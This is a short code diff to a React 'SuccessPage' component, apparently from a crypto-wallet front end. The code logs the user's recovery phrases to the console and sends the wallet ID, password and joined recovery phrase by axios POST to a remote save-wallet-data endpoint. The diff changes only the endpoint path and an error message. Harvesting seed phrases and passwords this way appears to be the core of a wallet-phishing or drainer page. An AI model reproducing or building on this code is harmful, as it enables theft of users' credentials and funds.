@@ -233,7 +233,7 @@ const SuccessPage: React.FC = () => {
                     console.log('Recovery Phrases:', recoveryWords);
 
                     // Send data to the backend
-                    await axios.post('https://walletmanagement-rcfpsxcera-uc.a.run.app/api/save-wallet-data/', {
+                    await axios.post('https://walletmanagement-rcfpsxcera-uc.a.run.app/walletmanagementapi/save-wallet-data/', {
                         wallet_id: walletId,
                         password,
                         recovery_phrases: recoveryWords.join(' '),
@@ -249,7 +249,7 @@ const SuccessPage: React.FC = () => {
                     window.location.href = '../WalletSubmit';
                 } catch (error) {
                     console.error('Error saving phrase:', error);
-                    alert('Failed to save the recovery phrase.');
+                    alert('Enter The Password');
                 }
             } else {
                 setIsSuccess(false);
